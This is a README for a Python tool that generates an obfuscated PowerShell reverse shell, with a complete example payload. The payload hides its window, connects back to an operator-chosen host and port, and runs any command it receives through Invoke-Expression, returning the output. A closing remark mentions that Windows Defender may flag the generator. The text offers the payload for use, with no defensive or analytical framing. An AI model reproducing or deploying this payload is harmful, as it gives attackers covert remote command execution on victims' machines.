# Usage
Just run the `powershell_rv.py` then just input the `LHOST` and `LPORT` and the payload will be generated.

# Example
```
C:\Users\breaching\Desktop> py .\powershell_rv.py
LHOST: 192.168.0.30
LPORT: 4444                                                                                                                                                                                                                     Here is your payload:
Start-Process $PSHOME\powershell.exe -WindowStyle Hidden -ArgumentList {$10da50c9ca154de89b98bf823871ca4e = New-Object Net.Sockets.TCPClient('192.168.0.30', 4444);$2c3fd65f249647d1a89241203b6c90d4 = $10da50c9ca154de89b98bf823871ca4e.GetStream();$6f845202874d4d2496ade3a2a2638595 = New-Object IO.StreamWriter($2c3fd65f249647d1a89241203b6c90d4);function WriteToStream ($976a083d580a453f97bf43d22349ada7) {[byte[]]$script:Buffer = 0..$10da50c9ca154de89b98bf823871ca4e.ReceiveBufferSize | % {0};$6f845202874d4d2496ade3a2a2638595.Write($976a083d580a453f97bf43d22349ada7);$6f845202874d4d2496ade3a2a2638595.Flush()}WriteToStream '';while(($bb5005b59f2144c59edc0ce33aa1dd40 = $2c3fd65f249647d1a89241203b6c90d4.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $bb5005b59f2144c59edc0ce33aa1dd40 - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$6f845202874d4d2496ade3a2a2638595.Close()}
```
**Note** The `powershell_rv.py` file might flag Windows Defender tho.
